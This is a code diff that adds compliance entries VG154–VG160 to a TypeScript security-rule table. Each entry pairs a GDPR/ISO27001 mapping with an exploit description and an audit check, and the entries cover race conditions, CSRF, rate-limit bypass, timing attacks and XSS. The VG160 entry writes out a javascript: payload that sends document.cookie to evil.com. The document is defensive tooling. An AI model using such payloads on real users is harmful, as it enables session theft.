@@ -327,6 +327,49 @@ export const complianceMetadata: Record<string, ComplianceExtension> = {
     exploit: "Attacker injects % or PostgREST filter syntax into the search input to read all records or bypass the ilike filter constraints.",
     audit: "Show that user input in ilike/like patterns is escaped with a custom escapeLike function.",
   },
+  // === AI BENCHMARK PHASE 2 (VG154-VG160) ===
+  VG154: {
+    gdpr: ["GDPR:Art32(1)(a)", "GDPR:Art25"],
+    iso27001: ["ISO27001:A.8.24", "ISO27001:A.8.3"],
+    exploit: "Attacker sends multiple concurrent requests to spend credits. Both requests read the same balance, both pass the check, both deduct — user spends once but gets double the service.",
+    audit: "Show that all balance/quota operations use atomic database transactions or server-side RPC functions.",
+  },
+  VG155: {
+    gdpr: ["GDPR:Art32(1)(b)"],
+    iso27001: ["ISO27001:A.8.3"],
+    exploit: "Attacker crafts a malicious page that submits a hidden form to the victim's session, causing unwanted actions (delete account, transfer funds).",
+    audit: "Show CSRF token validation on all state-changing endpoints.",
+  },
+  VG156: {
+    gdpr: ["GDPR:Art32(1)(a)"],
+    iso27001: ["ISO27001:A.8.24"],
+    exploit: "Attacker sends requests from multiple IPs. Because each serverless instance has its own Map, the rate counter never accumulates enough to trigger the limit.",
+    audit: "Show that rate limiting uses external state (Redis). Demonstrate rate limit persistence across function cold starts.",
+  },
+  VG157: {
+    gdpr: ["GDPR:Art32(1)(a)"],
+    iso27001: ["ISO27001:A.8.24"],
+    exploit: "Attacker waits for Redis outage, then sends unlimited requests while the rate limiter silently allows everything.",
+    audit: "Show that rate limiter catch blocks return limited: true. Demonstrate fail-closed behavior during backend outage.",
+  },
+  VG158: {
+    gdpr: ["GDPR:Art32(1)(b)"],
+    iso27001: ["ISO27001:A.5.15"],
+    exploit: "Attacker registers with a mangled role string. The normalizeRole function falls through to 'member' default, granting unintended access.",
+    audit: "Show that role normalization defaults to 'guest' or throws. Demonstrate that unknown role strings result in no access.",
+  },
+  VG159: {
+    gdpr: ["GDPR:Art32(1)(a)"],
+    iso27001: ["ISO27001:A.8.24"],
+    exploit: "Attacker sends thousands of requests with different secret guesses, measuring response times to brute-force the secret character by character.",
+    audit: "Show that all secret comparisons use timingSafeEqual. Demonstrate no === or !== for tokens or API keys.",
+  },
+  VG160: {
+    gdpr: ["GDPR:Art32(1)(a)"],
+    iso27001: ["ISO27001:A.8.24"],
+    exploit: "Attacker sets their profile URL to 'javascript:document.location=\"https://evil.com/steal?\"+document.cookie'. When another user clicks the link, their session is stolen.",
+    audit: "Show URL protocol validation for all user-provided links. Demonstrate that javascript: and data: protocols are blocked.",
+  },
 };
 
 /**
